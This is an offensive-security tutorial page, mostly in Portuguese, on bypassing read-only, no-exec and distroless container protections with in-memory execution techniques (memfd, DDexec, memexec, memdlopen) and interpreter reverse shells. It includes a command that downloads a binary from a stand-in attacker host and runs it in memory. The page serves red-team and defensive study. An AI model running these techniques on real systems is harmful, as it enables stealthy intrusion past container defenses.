# Bypass FS protections: read-only / no-exec / Distroless

{{#include ../../../banners/hacktricks-training.md}}


## Vídeos

In the following videos you can find the techniques mentioned in this page explained more in depth:

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## Cenário read-only / no-exec

É cada vez mais comum encontrar máquinas Linux montadas com **read-only (ro) file system protection**, especialmente em containers. Isso porque para executar um container com filesystem ro é tão simples quanto definir **`readOnlyRootFilesystem: true`** no `securitycontext`:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

No entanto, mesmo se o sistema de arquivos estiver montado como ro, **`/dev/shm`** ainda será gravável, então não é verdade que não podemos escrever nada no disco. Contudo, essa pasta será **mounted with no-exec protection**, portanto se você baixar um binário aqui você **não conseguirá executá-lo**.

> [!WARNING]
> From a red team perspective, this makes **complicated to download and execute** binaries that aren't in the system already (like backdoors o enumerators like `kubectl`).

## Easiest bypass: Scripts

Note que mencionei binários, você pode **executar qualquer script** desde que o interpretador esteja dentro da máquina, como um **shell script** se `sh` estiver presente ou um **python** **script** se `python` estiver instalado.

No entanto, isso por si só não é suficiente para executar seu backdoor binário ou outras ferramentas binárias que você possa precisar rodar.

## Memory Bypasses

Se você quer executar um binário mas o sistema de arquivos não permite, a melhor forma é **executá-lo a partir da memória**, já que as **proteções não se aplicam lá**.

### FD + exec syscall bypass

Se você tem alguns engines de script poderosos dentro da máquina, como **Python**, **Perl**, ou **Ruby**, você pode baixar o binário para executar a partir da memória, armazená-lo em um descritor de arquivo de memória (`create_memfd` syscall), que não será protegido por essas proteções, e então chamar um **`exec` syscall** indicando o **fd como o arquivo a ser executado**.

Para isso você pode usar facilmente o projeto [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Você pode passar um binário e ele irá gerar um script na linguagem indicada com o **binário comprimido e codificado em b64** com as instruções para **decodificá-lo e descomprimir‑lo** em um **fd** criado chamando o syscall `create_memfd` e uma chamada ao **exec** syscall para executá‑lo.

> [!WARNING]
> This doesn't work in other scripting languages like PHP or Node because they don't have any d**efault way to call raw syscalls** from a script, so it's not possible to call `create_memfd` to create the **memory fd** to store the binary.
>
> Moreover, creating a **regular fd** with a file in `/dev/shm` won't work, as you won't be allowed to run it because the **no-exec protection** will apply.

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) é uma técnica que permite **modificar a memória do seu próprio processo** sobrescrevendo seu **`/proc/self/mem`**.

Portanto, **controlando o código assembly** que está sendo executado pelo processo, você pode escrever um **shellcode** e "mutar" o processo para **executar qualquer código arbitrário**.

> [!TIP]
> **DDexec / EverythingExec** permitirá que você carregue e **execute** seu próprio **shellcode** ou **qualquer binário** a partir da **memória**.
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Para mais informações sobre esta técnica verifique o Github ou:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) é o passo natural seguinte do DDexec. É um **DDexec shellcode demonised**, então toda vez que você quiser **executar um binário diferente** não precisa relançar o DDexec; você pode simplesmente executar o shellcode memexec via a técnica DDexec e então **comunicar-se com esse daemon para fornecer novos binários para carregar e executar**.

Você pode encontrar um exemplo de como usar **memexec para executar binários a partir de um PHP reverse shell** em [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Com um propósito similar ao do DDexec, a técnica [**memdlopen**](https://github.com/arget13/memdlopen) permite uma **maneira mais fácil de carregar binários** na memória para depois executá-los. Pode até permitir carregar binários com dependências.

## Distroless Bypass

Para uma explicação dedicada sobre **o que distroless realmente é**, quando ajuda, quando não ajuda, e como altera as técnicas de pós-exploração em containers, confira:

{{#ref}}
../../privilege-escalation/container-security/distroless.md
{{#endref}}

### What is distroless

Containers distroless contêm apenas os **componentes mínimos necessários para executar uma aplicação ou serviço específico**, como bibliotecas e dependências de runtime, mas excluem componentes maiores como um gerenciador de pacotes, shell ou utilitários do sistema.

O objetivo dos containers distroless é **reduzir a superfície de ataque dos containers ao eliminar componentes desnecessários** e minimizar o número de vulnerabilidades que podem ser exploradas.

### Reverse Shell

Em um container distroless você pode **nem sequer encontrar `sh` ou `bash`** para obter um shell regular. Também não encontrará binários como `ls`, `whoami`, `id`... tudo o que você normalmente executa em um sistema.

> [!WARNING]
> Portanto, você **não** será capaz de obter um **reverse shell** ou **enumerate** o sistema como normalmente faz.

No entanto, se o container comprometido estiver, por exemplo, executando um aplicativo Flask, então o Python está instalado e, portanto, você pode obter um **Python reverse shell**. Se estiver executando Node, você pode obter um Node rev shell, e o mesmo vale para praticamente qualquer **scripting language**.

> [!TIP]
> Usando a scripting language você poderia **enumerate the system** usando as capacidades da linguagem.

Se não existirem proteções **`read-only/no-exec`** você poderia abusar do seu reverse shell para **escrever no sistema de arquivos seus binários** e **executá-los**.

> [!TIP]
> No entanto, nesse tipo de containers essas proteções geralmente existirão, mas você pode usar as **técnicas de execução em memória mencionadas anteriormente para contorná-las**.

Você pode encontrar **exemplos** de como **explorar algumas vulnerabilidades RCE** para obter scripting languages reverse shells e executar binários a partir da memória em [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).


{{#include ../../../banners/hacktricks-training.md}}
